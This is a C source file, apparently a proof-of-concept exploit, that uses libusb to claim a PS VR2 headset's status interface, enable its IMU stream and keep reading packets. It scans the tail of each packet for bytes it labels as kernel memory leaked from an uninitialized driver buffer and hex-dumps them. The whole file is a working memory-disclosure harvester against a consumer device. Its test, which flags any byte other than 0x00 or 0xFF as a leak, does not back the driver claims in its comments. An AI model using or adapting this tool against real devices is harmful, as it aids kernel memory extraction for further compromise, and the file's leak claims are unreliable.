#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef _WIN32
#include <windows.h>
#define usleep(x) Sleep((x)/1000)
#else
#include <unistd.h>
#endif

#include "hmd2_libusb.h"
#include "libusb/libusb.h"

 // Configuration
#define STATUS_INTERFACE 7
#define STATUS_ENDPOINT  0x88 
#define PACKET_SIZE      1024
#define LEAK_SCAN_START  512   // Scan the tail of the packet for uninitialized memory

void hex_dump(const char* label, const unsigned char* data, int size)
{
    printf("%s [%d bytes]:\n", label, size);
    for (int i = 0; i < size; i++)
    {
        printf("%02X ", data[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");
}

int main(int argc, char* argv[])
{
    libusb_context* ctx = hmd2_libusb_init(0);
    if (!ctx) return 1;

    printf("[*] Connecting to PS VR2...\n");
    libusb_device_handle* dev = hmd2_libusb_open(ctx);
    while (!dev)
    {
        printf("[!] Device not found. Retrying in 500ms...\n");
        usleep(500000);
        dev = hmd2_libusb_open(ctx);
    }

    printf("[+] Connected. Claiming Status Interface (%d)...\n", STATUS_INTERFACE);
    if (libusb_claim_interface(dev, STATUS_INTERFACE) < 0)
    {
        fprintf(stderr, "[!] Error: Could not claim interface. Ensure the driver is installed (WinUSB).\n");
        libusb_close(dev);
        libusb_exit(ctx);
        return 1;
    }

    // activate alternate setting 1 to enable the IMU data stream
    printf("[*] Activating Alternate Setting 1 (IMU Stream Enable)...\n");
    if (libusb_set_interface_alt_setting(dev, STATUS_INTERFACE, 1) < 0)
    {
        fprintf(stderr, "[!] Error: Failed to set alternate setting.\n");
        libusb_release_interface(dev, STATUS_INTERFACE);
        libusb_close(dev);
        libusb_exit(ctx);
        return 1;
    }

    printf("[*] Monitoring endpoint 0x%02x for kernel memory leaks...\n", STATUS_ENDPOINT);
    printf("[*] Press Ctrl+C to stop.\n\n");

    unsigned char buffer[PACKET_SIZE];
    int transferred;
    int total_leaks = 0;

    while (1)
    {
        int r = libusb_interrupt_transfer(dev, STATUS_ENDPOINT, buffer, sizeof(buffer), &transferred, 2000);
        if (r == 0)
        {
            int found_leak = 0;
            // The IMU driver (sieimu) often leaves large portions of its FIFO buffer uninitialized.
            // These regions contain physical memory residues from previous kernel allocations.
            for (int i = LEAK_SCAN_START; i < transferred; i++)
            {
                if (buffer[i] != 0x00 && buffer[i] != 0xFF)
                { // ignore common filler
                    found_leak = 1;
                    total_leaks++;
                    printf("\n[!] %02d: KERNEL LEAK DETECTED at offset +0x%X\n", total_leaks, i);
                    hex_dump("Fragment Data", &buffer[i], (transferred - i > 64) ? 64 : (transferred - i));
                    break;
                }
            }
            if (!found_leak)
            {
                printf("."); fflush(stdout);
            }
        }
        else if (r == LIBUSB_ERROR_TIMEOUT)
        {
            printf("T"); fflush(stdout); // stream may be idle
        }
        else
        {
            printf("\n[!] USB Transfer Error: %d\n", r);
            break;
        }
        usleep(10000); // small delay to avoid cpu pinning
    }

    printf("\n[+] Closing connection...\n");
    libusb_release_interface(dev, STATUS_INTERFACE);
    libusb_close(dev);
    libusb_exit(ctx);
    return 0;
}
